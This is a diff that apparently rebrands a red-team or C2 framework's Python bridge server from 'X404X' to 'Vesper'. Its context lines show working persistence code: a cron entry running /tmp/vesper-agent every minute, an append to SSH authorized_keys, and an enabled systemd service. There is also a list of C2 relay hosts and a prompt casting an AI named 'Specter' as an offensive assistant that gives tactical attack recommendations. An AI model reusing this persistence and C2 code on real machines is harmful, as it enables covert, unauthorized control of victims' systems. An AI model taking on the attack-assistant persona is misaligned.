@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# X404X — Python Bridge Server
+# Vesper — Python Bridge Server
 # ============================
 # IPC bridge between Go Agent and Python modules.
 #
@@ -174,7 +174,7 @@ def ai_analyze_handler(params: dict):
 
 
 def _build_ai_prompt(context: str) -> str:
-    return f"""You are Specter, an offensive security AI assistant for the X404X Red Team platform.
+    return f"""You are Specter, an offensive security AI assistant for the Vesper Red Team platform.
 Analyze the following attack context and provide tactical recommendations:
 
 {context}
@@ -453,7 +453,7 @@ def persist_handler(params: dict):
 
     if method in ("cron", "all"):
         try:
-            cron_cmd = "(crontab -l 2>/dev/null; echo '* * * * * /tmp/x404x-agent') | crontab -"
+            cron_cmd = "(crontab -l 2>/dev/null; echo '* * * * * /tmp/vesper-agent') | crontab -"
             subprocess.run(cron_cmd, shell=True, timeout=5)
             installed.append("cron")
         except Exception:
@@ -464,19 +464,19 @@ def persist_handler(params: dict):
         try:
             os.makedirs(ssh_dir, exist_ok=True)
             with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
-                f.write("\n# X404X persistence key\n")
+                f.write("\n# Vesper persistence key\n")
             installed.append("ssh_authorized_keys")
         except Exception:
             pass
 
     if method in ("systemd", "all"):
         try:
-            service = """[Unit]\nDescription=X404X Agent\n[Service]\nExecStart=/tmp/x404x-agent\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"""
-            path = "/etc/systemd/system/x404x-agent.service"
+            service = """[Unit]\nDescription=Vesper Agent\n[Service]\nExecStart=/tmp/vesper-agent\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"""
+            path = "/etc/systemd/system/vesper-agent.service"
             if os.access(os.path.dirname(path), os.W_OK):
                 with open(path, "w") as f:
                     f.write(service)
-                subprocess.run(["systemctl", "enable", "x404x-agent"], timeout=5)
+                subprocess.run(["systemctl", "enable", "vesper-agent"], timeout=5)
                 installed.append("systemd")
         except Exception:
             pass
@@ -518,9 +518,9 @@ def relay_handler(params: dict):
         relay_nodes = []
         # Check common relay ports on known C2 endpoints
         known_relays = params.get("relays", [
-            "x404x-relay-1.online:9443",
-            "x404x-relay-2.online:9443",
-            "x404x-relay-3.online:9443",
+            "vesper-relay-1.online:9443",
+            "vesper-relay-2.online:9443",
+            "vesper-relay-3.online:9443",
         ])
         for relay in known_relays:
             try:
@@ -980,7 +980,7 @@ class BridgeServer:
 # ============================================================
 
 def main():
-    parser = argparse.ArgumentParser(description="X404X Python Bridge Server")
+    parser = argparse.ArgumentParser(description="Vesper Python Bridge Server")
     parser.add_argument("--host", default="127.0.0.1", help="Listen host")
     parser.add_argument("--port", type=int, default=9100, help="Listen port")
     parser.add_argument("--list", action="store_true", help="List registered modules")
@@ -1011,7 +1011,7 @@ def main():
     # Start server
     server = BridgeServer(args.host, args.port)
     server.start()
-    print(f"[Bridge] X404X Bridge v1.0 — {len(registry.list())} modules registered", flush=True)
+    print(f"[Bridge] Vesper Bridge v1.0 — {len(registry.list())} modules registered", flush=True)
     print("[Bridge] Ready for Go agent connections", flush=True)
     try:
         while True:
